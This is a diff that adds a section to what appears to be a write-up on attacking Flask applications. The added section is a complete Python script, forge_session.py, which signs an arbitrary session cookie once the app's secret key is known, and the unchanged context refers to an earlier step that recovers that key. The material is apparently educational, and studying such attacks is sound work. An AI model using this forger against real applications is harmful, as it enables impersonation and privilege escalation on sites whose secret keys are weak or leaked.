@@ -77,6 +77,42 @@ we can also use Python scripts to get the value of the secret key, then create a
         pass
     print("no match"); sys.exit(2)
 
+script uses the secret key to encode data into the Flask cookie
+
+    #!/usr/bin/env python3
+    '''
+    This script takes in two arguments: 1) a secret key for
+    creating Flask session tokens, and 2) a cookie key / value
+    pair that we want to embed into the resulting Flask token
+    '''
+
+    import sys
+    from flask import Flask
+    from flask.sessions import SecureCookieSessionInterface
+
+    if len(sys.argv) != 3:
+      print("usage: python forge_session.py <secret> <key=value>")
+      sys.exit(1)
+
+    secret = sys.argv[1]
+    pair = sys.argv[2]
+
+    if "=" not in pair:
+      print("pair must be in form key=value")
+      sys.exit(1)
+
+    k, v = pair.split("=", 1)
+
+    app = Flask(__name__)
+    app.secret_key = secret
+    s = SecureCookieSessionInterface().get_signing_serializer(app)
+    if s is None:
+       print("Could not create serializer (is Flask installed?)")
+       sys.exit(1)
+
+    session_dict = {k: v}
+    cookie = s.dumps(session_dict)
+    print(cookie)
                          
                  
                                    
